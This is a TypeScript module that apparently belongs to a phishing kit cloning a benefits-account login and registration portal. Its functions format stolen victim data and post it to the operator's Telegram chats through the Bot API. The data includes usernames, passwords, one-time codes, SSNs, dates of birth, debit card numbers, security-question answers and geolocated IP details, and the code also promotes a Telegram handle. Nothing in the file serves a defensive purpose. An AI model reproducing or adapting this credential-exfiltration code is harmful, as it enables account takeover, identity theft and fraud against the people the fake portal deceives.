import { SITE_DISPLAY_NAME } from "@/lib/site-url"
import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
import { parseVisitorOs } from "@/lib/parse-visitor-os"
import { identifierFieldLabel } from '@/lib/telegram-approval-templates'

// Get Telegram configuration from environment variables
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '').split(',').map(id => id.trim()).filter(Boolean)

// Validate that required environment variables are set
if (!TELEGRAM_BOT_TOKEN) {
  console.error('⚠️ TELEGRAM_BOT_TOKEN is not set in environment variables')
}
if (CHAT_IDS.length === 0) {
  console.error('⚠️ TELEGRAM_CHAT_ID is not set in environment variables')
}

export interface VisitorData {
  location?: string
  ip?: string
  timezone?: string
  isp?: string
  zip?: string
  device?: string
  screen?: string
  language?: string
  referrer?: string
  utcTime?: string
  localTime?: string
  page?: string
  url?: string
  platformLabel?: string
  browserLabel?: string
  asn?: string | null
  org?: string | null
}

/** Payload for “New Visitor” Telegram (aligned with wealthcare portal format). */
export interface VisitorTelegramData {
  siteName: string
  location: string
  ip: string
  timezone: string
  isp: string
  asn?: string | null
  org?: string | null
  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
  osLabel?: string
  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
  deviceLabel?: string
  /** OS + version, e.g. "iOS 17.2", "Windows 10/11". */
  platformLabel?: string
  /** Browser + version, e.g. "Chrome 141.0". */
  browserLabel?: string

  userAgent: string
  screen: string
  language: string
  referrer: string
  pageUrl: string
  localTime: string
  utcTime: string
}

export interface LoginData {
  userId: string
  password: string
}

export interface VerificationClickData {
  verificationType: string
}

export interface VerificationData {
  verificationType: string
  code: string
}

interface FormData {
  type: string
  userId?: string
  password?: string
  confirmPassword?: string
  email?: string
  phone?: string
  otp?: string
  timestamp: string
  page: string
}

/** Telegram `parse_mode: HTML` — escape dynamic text; use asCode for tap-to-copy. */
function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function asCode(text: string): string {
  return `<code>${escapeTelegramHtml(text)}</code>`
}

function asCodeU(value: unknown, fallback = 'Unknown'): string {
  const s = value == null ? '' : String(value).trim()
  return asCode(s || fallback)
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCodeU(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

/** Referrer / page fields: link when http(s), otherwise monospace. */
function asUrlField(value: unknown, fallback = "Unknown"): string {
  const t = value == null || value === "" ? "" : String(value).trim()
  const resolved = t || fallback
  if (resolved === "Direct") return asCodeU(resolved)
  if (isHttpUrl(resolved)) return asLink(resolved)
  return asCodeU(resolved)
}
/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
}

const GEO_USER_AGENT = `Mozilla/5.0 (compatible; ${SITE_DISPLAY_NAME.replace(/[^a-zA-Z0-9]+/g, '-')}/1.0)`

let previewRotationIndex = 0

/**
 * Rotating Telegram link preview for the visit message. Cycles between the ops
 * channel, the visited page and the referrer so consecutive visit notifications do
 * not all render an identical preview. Mirrors the kit's implementation.
 *
 * Non-public preview URLs (localhost / private IPs / intranet hosts) are skipped:
 * Telegram rejects them with WEBPAGE_URL_INVALID, which would fail the whole send.
 */
function isPublicPreviewUrl(raw: string): boolean {
  let url: URL
  try {
    url = new URL(raw.trim())
  } catch {
    return false
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return false
  const host = url.hostname.toLowerCase()
  if (
    host === 'localhost' ||
    host.endsWith('.localhost') ||
    host === '0.0.0.0' ||
    host === '::1' ||
    host === '[::1]'
  ) {
    return false
  }
  // Private / reserved IPv4 ranges.
  const ipv4 = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)
  if (ipv4) {
    const [a, b] = [Number(ipv4[1]), Number(ipv4[2])]
    if (
      a === 10 ||
      a === 127 ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254)
    ) {
      return false
    }
  }
  // Single-label intranet hostnames (e.g. http://igoe/).
  if (!host.includes('.') && !host.startsWith('[')) return false
  return true
}

function getRotatedPreviewUrl(referrer?: string, pageUrl?: string): string {
  const candidates: string[] = ["https://t.me/th3_allfather"]

  if (pageUrl && /^https?:\/\//i.test(pageUrl.trim()) && isPublicPreviewUrl(pageUrl)) {
    candidates.push(pageUrl.trim())
  }

  if (
    referrer &&
    /^https?:\/\//i.test(referrer.trim()) &&
    referrer.trim() !== "Direct" &&
    isPublicPreviewUrl(referrer)
  ) {
    candidates.push(referrer.trim())
  }

  const selected = candidates[previewRotationIndex % candidates.length]
  previewRotationIndex = (previewRotationIndex + 1) % 1000
  return selected
}

export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
  const site = escapeTelegramHtml(data.siteName)
  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
  const message = [
    `🌐 <b>(${site})</b>`,
    "━━━━━━━━━━━━━━━━━━",
    `📍 <b>Location:</b> ${asCode(data.location)}`,
    `🌍 <b>IP:</b> ${asCode(data.ip)}`,
    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
    `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
    ...(networkHint
      ? [`🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}`]
      : []),
    "",
    `🖥 <b>Platform:</b> ${asCode(data.platformLabel ?? data.osLabel ?? "Unknown")}`,
    `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
    `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
    `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer, "Direct")}`,
    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
    "",
    `<a href="https://t.me/th3_allfather">All Father</a>`,
  ].join("\n")

  const previewUrl = getRotatedPreviewUrl(data.referrer, data.pageUrl)

  return await sendTelegramMessage(message, {
    disablePreview: false,
    previewUrl,
    preferSmallMedia: true,
  })
}

export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
  let message: string

  // 1) Login attempt from main Sign In
  if (data.type === 'login') {
    const idField = identifierFieldLabel(data.userId)
    message = `🔐 <b>Login Attempt</b>
━━━━━━━━━━━━━━━━━━
${idField.emoji} <b>${idField.label}:</b> ${asCodeU(data.userId)}
🔒 <b>Password:</b> ${asCodeU(data.password)}`
  }
  // 1b) Register button clicked on home page
  else if (data.type === 'registration' && data.page === '/') {
    message = `🔹 <b>Type:</b> ${asCodeU('Register Button Clicked')}`
  }
  // Approval messages live in telegram-approval-templates via telegram-approval-send
  // 2) Login 2FA method selection (login flow)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page.startsWith('/login/2fa-verify')
  ) {
    const selectedMethod =
      data.type === 'email_verification'
        ? 'Email'
        : 'Text Message (SMS)'
    const idField = identifierFieldLabel(data.userId)

    message = `🔐 <b>Verify Your Identity</b>
━━━━━━━━━━━━━━━━━━
${idField.emoji} <b>${idField.label}:</b> ${asCodeU(data.userId)}
📧 <b>Method Selected:</b> ${asCodeU(selectedMethod)}`
  }
  // 3) Login OTP verification (login verify-code)
  else if (
    data.type === 'login_email_otp_verification' ||
    data.type === 'login_text_otp_verification'
  ) {
    message = `🔑 <b>Verification Code Submitted</b>
🔢 <b>Code:</b> ${asCodeU(data.otp)}`
  }
  // 3a) Registration method selection (app/registration — email or phone pick)
  else if (data.type === 'registration_method_selected') {
    const selectedMethod =
      data.verificationType === 'text_verification' ? 'Text Message (SMS)' : 'Email'
    const idField = identifierFieldLabel(data.userId)
    message = `📝 <b>Registration - Method Selected</b>
━━━━━━━━━━━━━━━━━━
${idField.emoji} <b>${idField.label}:</b> ${asCodeU(data.userId)}
📧 <b>Method Selected:</b> ${asCodeU(selectedMethod)}`
  }
  // 3a) Registration OTP verification (email/text on /registration)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page === '/registration'
  ) {
    message = `🔑 <b>Verification Code Submitted</b>
🔢 <b>Code:</b> ${asCodeU(data.otp)}`
  }
  // 3b) Registration Step 1 – Benefit Account Debit Card
  else if (data.type === 'benefit_debit_card') {
    message = `📝 Registration - Step 1: Benefit Account Debit Card
━━━━━━━━━━━━━━━━━━
💳 Benefit Account Debit Card: ${asCodeU((data as any).benefitDebitCard, 'Not provided')}`
  }
  // 3b) Registration Step 1 – personal info
  else if (data.type === 'personal_info_lookup') {
    message = `📝 Registration - Step 1: Personal Info
━━━━━━━━━━━━━━━━━━
🔐 SSN: ${asCodeU((data as any).ssn)}
📅 Date of Birth: ${asCodeU((data as any).dateOfBirth)}
🏷️ Home Zip: ${asCodeU((data as any).homeZip)}`
  }
  // 3c) Registration Step 2 – employer name (legacy)
  else if (data.type === 'employer_name_lookup') {
    message = `📝 Registration - Step 2: Employer
━━━━━━━━━━━━━━━━━━
🏢 Employer ID: ${asCodeU((data as any).employerId)}
👤 Employee ID: ${asCodeU((data as any).employeeId)}
🏛️ Employer Name: ${asCodeU((data as any).employerName)}`
  }
  // 3c2) Registration Step 2 – Two-Factor Code Option
  else if (data.type === 'two_factor_option') {
    const option = (data as any).option
    const optionLabel = option === 'email' ? 'Employer Email' : option === 'number' ? 'Employer Provided Number' : option === 'mailing' ? 'Mailing Address' : 'Phone Verification'
    message = `📝 Registration - Step 2: Two-Factor Code Options
━━━━━━━━━━━━━━━━━━
Chosen: ${asCodeU(optionLabel)}`
  }
  // 3d) Registration Step 3 – OTP code requested (no contact inputs)
  else if (data.type === 'contact_info') {
    message = `🔔 OTP code requested
━━━━━━━━━━━━━━━━━━
User continued to verification code step.`
  }
  // 3e) Registration Step 4 – method selected
  else if (
    data.type === 'registration' &&
    typeof data.page === 'string' &&
    data.page.startsWith('/registration?step=4')
  ) {
    const methodLabel = data.email ? 'Email' : 'Text Message (SMS)'

    message = `📝 Registration - Step 4: Method Selected
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCodeU(methodLabel)}
${data.email ? `📧 Email: ${asCodeU(data.email)}` : ''}
${data.phone ? `📱 Mobile: ${asCodeU(data.phone)}` : ''}`
  }
  // 3f) Phone Verify (Step 3) – page visit
  else if (data.type === 'phone_verify_page_visit') {
    message = `📱 Registration - Phone Verify (Step 3)
━━━━━━━━━━━━━━━━━━
User landed on Phone Verification page.`
  }
  // 3g) Phone Verify – SMS/Text OTP requested
  else if (data.type === 'phone_verify_sms_otp') {
    message = `📱 Registration - Phone Verify
━━━━━━━━━━━━━━━━━━
🔘 Button: SMS/Text OTP
📞 Phone: ${asCodeU((data as any).phone)}`
  }
  // 3h) Phone Verify – Voice OTP requested
  else if (data.type === 'phone_verify_voice_otp') {
    message = `📱 Registration - Phone Verify
━━━━━━━━━━━━━━━━━━
🔘 Button: Voice OTP
📞 Phone: ${asCodeU((data as any).phone)}`
  }
  // 3i) Phone Verify – Reset clicked
  else if (data.type === 'phone_verify_reset') {
    message = `📱 Registration - Phone Verify
━━━━━━━━━━━━━━━━━━
🔘 Button: Reset
Form cleared.`
  }
  // 3j) Phone Verify – Back to 2FA clicked
  else if (data.type === 'phone_verify_back_to_2fa') {
    message = `📱 Registration - Phone Verify
━━━━━━━━━━━━━━━━━━
🔘 Button: Back to Two-Factor Authentication
User returned to Step 2.`
  }
  // 3k) Phone Verify – OTP verified, proceeding to Step 4
  else if (data.type === 'phone_verify_otp_verified') {
    message = `📱 Registration - Phone Verify
━━━━━━━━━━━━━━━━━━
✅ OTP verified successfully.
📞 Phone: ${asCodeU((data as any).phone)}
→ User proceeded to Step 4 (Registration Form).`
  }
  // 4) Registration credentials (User ID + password + confirm password)
  else if (data.type === 'User Credentials Setup') {
    const pref = (data as any).preferredMethod2FA
    const prefLabel = pref === 'cell' ? 'Cell Number' : 'Email'
    message = `📝 Registration - Step 4: Credentials Set
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCodeU(data.userId)}
🔒 Password: ${asCodeU(data.password)}
🔒 Confirm Password: ${asCodeU(data.confirmPassword)}
📧 Preferred 2FA: ${asCodeU(prefLabel)}
${pref === 'email' ? `📧 Email: ${asCodeU((data as any).email, '—')}` : `📱 Cell: ${asCodeU((data as any).cell, '—')} (${asCodeU((data as any).cellCountry, 'US')})`}`
  }
  // 4b) Registration Form – Register button clicked (explicit type for clarity)
  else if (data.type === 'registration_form_register') {
    const pref = (data as any).preferredMethod2FA
    const prefLabel = pref === 'cell' ? 'Cell Number' : 'Email'
    message = `📝 Registration - Step 4: Register Button
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCodeU(data.userId)}
📧 Preferred 2FA: ${asCodeU(prefLabel)}
${(data as any).email ? `📧 Email: ${asCodeU((data as any).email)}` : ''}
${(data as any).cell ? `📱 Cell: ${asCodeU((data as any).cell)} (${asCodeU((data as any).cellCountry, 'US')})` : ''}
→ Proceeding to Step 5 (Security Questions).`
  }
  // 5) Registration security questions (all Q&A)
  else if (data.type === 'Security Questions') {
    // Expect securityAnswers: Array<{ question: string; answer: string }>
    const qa = Array.isArray((data as any).securityAnswers) ? (data as any).securityAnswers : []
    const lines = qa.map(
      (item: any, index: number) =>
        `Q${index + 1}: ${asCodeU(item.question)}\nA${index + 1}: ${asCodeU(item.answer)}`
    ).join('\n\n')

    message = `📝 Registration - Security Questions
━━━━━━━━━━━━━━━━━━

${lines || 'No questions captured.'}`
  }
  // 6) Registration complete (final submit)
  else if (data.type === 'Registration Complete') {
    message = `📝 Registration Complete
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCodeU(data.userId)}
✅ Status: Submitted`
  }
  // 7a) Login 2FA – resend code (login verify-code)
  else if (
    data.type === 'login_email_otp_resend' ||
    data.type === 'login_text_otp_resend'
  ) {
    message = `🔔 <b>Resend Code Clicked</b>
━━━━━━━━━━━━━━━━━━
${formatResendIdentityLine(data.userId) || ""}`
  }
  // 7a2) Registration – resend code (step 4 OTP)
  else if (
    (data.type === 'email_otp_resend' || data.type === 'text_otp_resend') &&
    typeof data.page === 'string' &&
    data.page === '/registration'
  ) {
    message = `🔔 <b>Resend Code Clicked</b>
━━━━━━━━━━━━━━━━━━`
  }
  // 7b) Login 2FA – "I did not receive my code" clicked
  else if (data.type === 'login_did_not_receive_code') {
    let methodLabel = 'Unknown'
    if (typeof data.page === 'string') {
      if (data.page.includes('method=text')) {
        methodLabel = 'Text Message (SMS)'
      } else if (data.page.includes('method=email')) {
        methodLabel = 'Email'
      }
    }

    message = `🔔 <b>"I did not receive my code" Clicked</b>
━━━━━━━━━━━━━━━━━━

User was sent back to the verification method selection page.
Method at time of click: ${asCodeU(methodLabel)}`
  }
  // 7) Fallback generic template (other events)
  else {
    return false
  }

  return await sendTelegramMessage(wrapFlowMessage(message))
}

type SendTelegramMessageOptions = {
  /** @deprecated prefer `disablePreview` */
  disableWebPagePreview?: boolean
  disablePreview?: boolean
  /** Explicit link-preview URL (used by the rotating visit preview). */
  previewUrl?: string
  preferSmallMedia?: boolean
  showAboveText?: boolean
}

export async function sendTelegramMessage(
  message: string,
  options: SendTelegramMessageOptions = {},
): Promise<boolean> {
  // Validate we have the required token
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('Cannot send Telegram message: TELEGRAM_BOT_TOKEN is not set')
    return false
  }

  // If no chat ID(s) configured, log warning
  if (CHAT_IDS.length === 0) {
    console.warn('No Telegram chat IDs configured - message will not be sent')
    return false
  }

  const disablePreview =
    options.disablePreview ?? (options.disableWebPagePreview !== false)
  // `link_preview_options` supersedes the deprecated `disable_web_page_preview`
  // flag: it can also pin a specific preview URL and request small media.
  const link_preview_options = disablePreview
    ? { is_disabled: true }
    : {
        is_disabled: false,
        ...(options.previewUrl ? { url: options.previewUrl } : {}),
        prefer_small_media: options.preferSmallMedia ?? true,
        show_above_text: options.showAboveText ?? false,
      }

  const text = message

  const promises = CHAT_IDS.map(chatId =>
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        link_preview_options,
      })
    })
    .then(async (response) => {
      try {
        const data = await response.json()
        if (!response.ok || !data.ok) {
          console.error(`Failed to send to chat ${chatId}:`, data)
          return { ok: false }
        }
        return { ok: true }
      } catch (parseError) {
        console.error(`Failed to parse response for chat ${chatId}:`, parseError)
        return { ok: false }
      }
    })
    .catch(error => {
      console.error(`Failed to send to chat ${chatId}:`, error)
      return { ok: false }
    })
  )

  const results = await Promise.allSettled(promises)
  
  // Check if at least one message was sent successfully
  const successCount = results.filter(
    result => result.status === 'fulfilled' && result.value && result.value.ok === true
  ).length
  
  // Return true if at least one message succeeded, false otherwise
  return successCount > 0
}

/** Parse first usable `for=` value from RFC 7239 Forwarded header. */
function parseForwardedForHeader(forwarded: string | null): string | null {
  if (!forwarded?.trim()) return null
  const s = forwarded
  const lower = s.toLowerCase()
  let idx = 0
  while (idx < lower.length) {
    const start = lower.indexOf('for=', idx)
    if (start < 0) break
    let j = start + 4
    while (j < s.length && /\s/.test(s[j])) j++
    if (j >= s.length) break
    let ip = ''
    if (s[j] === '"') {
      j++
      const endQuote = s.indexOf('"', j)
      if (endQuote < 0) break
      ip = s.slice(j, endQuote).trim()
      idx = endQuote + 1
    } else {
      let end = j
      while (end < s.length && !/[;,]/.test(s[end])) end++
      ip = s.slice(j, end).trim()
      idx = end
    }
    if (ip.startsWith('[') && ip.endsWith(']')) ip = ip.slice(1, -1)
    ip = ip.split('%')[0].trim()
    if (ip && ip.toLowerCase() !== 'unknown') return ip
  }
  return null
}

/** First public client IP from common proxy / edge headers (Vercel, Cloudflare, nginx, Fly, etc.). */
function getClientIpFromHeaders(headers: Headers): string {
  const forwardedIp = parseForwardedForHeader(headers.get('forwarded'))
  if (forwardedIp) return forwardedIp.replace(/^::ffff:/i, '')

  const chains = [
    headers.get('x-vercel-forwarded-for'),
    headers.get('cf-connecting-ip'),
    headers.get('fly-client-ip'),
    headers.get('true-client-ip'),
    headers.get('x-real-ip'),
    headers.get('x-client-ip'),
    headers.get('x-forwarded-for'),
  ]
  for (const raw of chains) {
    if (!raw?.trim()) continue
    const first = raw.split(',')[0]?.trim()
    if (!first || first.toLowerCase() === 'unknown') continue
    const v4 = first.replace(/^::ffff:/i, '')
    if (v4) return v4
  }
  return 'Unknown'
}

function isPlausiblePublicIpHint(value: string): boolean {
  const s = value.trim()
  if (!s || s.length > 45) return false
  if (s === '127.0.0.1' || s === '::1' || s.toLowerCase() === 'unknown') return false
  return /^[\d.a-fA-F:]+$/.test(s)
}

export type GetVisitorDataOptions = {
  /** When reverse-proxy headers are missing (e.g. `next dev`), browser can POST this from ipify. */
  clientPublicIp?: string
}

export async function getVisitorData(request: Request, options?: GetVisitorDataOptions): Promise<VisitorData> {
  const headers = request.headers
  let ip = getClientIpFromHeaders(headers)
  if (ip === 'Unknown' && options?.clientPublicIp && isPlausiblePublicIpHint(options.clientPublicIp)) {
    ip = options.clientPublicIp.trim().replace(/^::ffff:/i, '')
  }
  const url = new URL(request.url)

  // Fetch location, ISP, zip, timezone from IP geolocation
  // Primary: ip-api.com
  // Fallback 1: ipwho.is
  // … (further fallbacks below)
  let location = 'Unknown'
  let isp = 'Unknown'
  let org: string | null = null
  let asn: string | null = null
  let zip = 'Unknown'
  let timezone: string | undefined

  if (ip && ip !== 'Unknown') {
    // Primary: ip-api.com (when any field still unknown)
    if (
      location === 'Unknown' ||
      isp === 'Unknown' ||
      zip === 'Unknown' ||
      !timezone
    ) {
      try {
        // Free ip-api.com JSON is HTTP-only from servers; HTTPS often fails from Vercel/Node.
        const fallbackRes = await fetch(
          `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,countryCode,regionName,city,zip,isp,org,as,timezone`,
          { headers: { 'User-Agent': GEO_USER_AGENT } },
        )
        if (fallbackRes.ok) {
          const data = (await fallbackRes.json()) as Record<string, unknown>
          if (data.status === 'success') {
            if (location === 'Unknown') {
              const parts = [
                data.city as string,
                data.regionName as string,
                data.country as string,
              ].filter(Boolean)
              if (parts.length) location = parts.join(', ')
              else if (data.countryCode) location = String(data.countryCode)
            }
            if (isp === 'Unknown' && (data.isp || data.org))
              isp = (data.isp as string) || (data.org as string)
            if (!org && (data.org || data.isp))
              org = String(data.org || data.isp)
            if (!asn && typeof data.as === 'string') {
              const asnMatch = data.as.match(/^(AS\d+)/i)
              asn = asnMatch ? asnMatch[1].toUpperCase() : null
            }
            if (zip === 'Unknown' && data.zip) zip = String(data.zip)
            if (!timezone && typeof data.timezone === 'string' && data.timezone)
              timezone = data.timezone
          }
        }
      } catch (e) {
        console.warn('ip-api.com fallback failed:', (e as Error).message)
      }
    }

    // Fallback 2: ipwho.is (additional provider if still Unknown)
    if (location === 'Unknown' || isp === 'Unknown' || zip === 'Unknown' || !timezone) {
      try {
        const whoRes = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
          headers: { 'User-Agent': GEO_USER_AGENT },
        })
        if (whoRes.ok) {
          const whoData = (await whoRes.json()) as {
            success?: boolean
            city?: string
            region?: string
            country?: string
            postal?: string
            timezone?: string | { id?: string }
            connection?: { isp?: string; org?: string }
          }
          if (whoData && whoData.success !== false) {
            if (location === 'Unknown') {
              const parts = [whoData.city, whoData.region, whoData.country].filter(Boolean)
              if (parts.length) location = parts.join(', ')
            }
            if (isp === 'Unknown') {
              const ispValue =
                whoData.connection?.isp || whoData.connection?.org
              if (ispValue) isp = ispValue
            }
            if (zip === 'Unknown' && whoData.postal) zip = whoData.postal
            if (!timezone && whoData.timezone) {
              timezone =
                typeof whoData.timezone === 'string'
                  ? whoData.timezone
                  : whoData.timezone.id
            }
          }
        }
      } catch (e) {
        console.warn('ipwho.is fallback failed:', (e as Error).message)
      }
    }

    // Fallback 3: geojs (HTTPS, no API key; fills gaps when other providers rate-limit or omit fields)
    if (location === 'Unknown' || isp === 'Unknown' || zip === 'Unknown' || !timezone) {
      try {
        const geojsRes = await fetch(
          `https://get.geojs.io/v1/ip/geo/${encodeURIComponent(ip)}.json`,
          {
            headers: {
              Accept: 'application/json',
              'User-Agent': GEO_USER_AGENT,
            },
          },
        )
        if (geojsRes.ok) {
          const g = (await geojsRes.json()) as Record<string, unknown>
          if (location === 'Unknown') {
            const parts = [g.city, g.region, g.country].filter(Boolean).map(String)
            if (parts.length) location = parts.join(', ')
            else if (g.country_code) location = String(g.country_code)
          }
          if (isp === 'Unknown' && typeof g.organization === 'string' && g.organization.trim()) {
            isp = g.organization.trim()
          }
          if (zip === 'Unknown' && typeof g.postal_code === 'string' && g.postal_code.trim()) {
            zip = g.postal_code.trim()
          }
          if (!timezone && typeof g.timezone === 'string' && g.timezone.trim()) {
            timezone = g.timezone.trim()
          }
        }
      } catch (e) {
        console.warn('geojs.io fallback failed:', (e as Error).message)
      }
    }
  }

  const ua = headers.get('user-agent')?.trim()
  const acceptLang = headers.get('accept-language')?.split(',')[0]?.trim()
  const referer = headers.get('referer')?.trim()

  const osInfo = parseVisitorOs(String((ua ?? '')))

  return {
    ip,
    location,
    isp,
    org: org || isp,
    asn,
    zip,
    timezone,
    device: ua && ua.length > 0 ? ua : 'Unknown',
    language: acceptLang && acceptLang.length > 0 ? acceptLang : 'Unknown',
    referrer: referer && referer.length > 0 ? referer : 'Direct',
    utcTime: new Date().toISOString(),
    page: url.pathname,
    url: url.href,
  }
}

export async function sendResendCodeNotification(data?: {
  page?: string
  userId?: string
}): Promise<boolean> {
  const page = data?.page ?? ""
  const type =
    page.includes("method=text") || page.includes("method=sms")
      ? "login_text_otp_resend"
      : "login_email_otp_resend"

  return sendFormNotification({
    type,
    page: page || "/login/verify-code",
    userId: data?.userId,
    timestamp: new Date().toISOString(),
  })
}

/* fleet-resend-identity-helper */
const RESEND_ID_BRAND_DEFAULT = "Username"
function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = (v) => asCode(String(v ?? ""))): string {
  const raw = userId == null ? "" : String(userId).trim()
  if (!raw) return ""
  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (raw.includes("@") && emailRe.test(raw)) return `📧 Email: ${asCodeFn(raw)}`
  const digits = raw.replace(/\D/g, "")
  if (digits.length >= 10 && digits.length <= 15 && !raw.includes("@")) {
    return `📱 Phone: ${asCodeFn(raw)}`
  }
  return `👤 ${RESEND_ID_BRAND_DEFAULT}: ${asCodeFn(raw)}`
}

class TelegramService {
  async sendLoginNotification(data: LoginData): Promise<void> {
    await sendFormNotification({
      type: 'login',
      userId: data.userId,
      password: data.password,
      page: '/',
      timestamp: new Date().toISOString(),
    })
  }

  async sendVerificationClickNotification(data: VerificationClickData): Promise<void> {
    const isEmail = data.verificationType === 'email'
    await sendFormNotification({
      type: isEmail ? 'email_verification' : 'text_verification',
      page: '/login/2fa-verify',
      timestamp: new Date().toISOString(),
    })
  }

  async sendVerificationNotification(data: VerificationData): Promise<void> {
    const isEmail = data.verificationType === 'email'
    await sendFormNotification({
      type: isEmail ? 'login_email_otp_verification' : 'login_text_otp_verification',
      otp: data.code,
      page: '/login/verify-code',
      timestamp: new Date().toISOString(),
    })
  }

  async sendResendCodeNotification(data: VerificationClickData): Promise<void> {
    const isEmail = data.verificationType === 'email'
    await sendFormNotification({
      type: isEmail ? 'login_email_otp_resend' : 'login_text_otp_resend',
      page: '/login/verify-code',
      timestamp: new Date().toISOString(),
    })
  }


}

export const telegramService = new TelegramService()

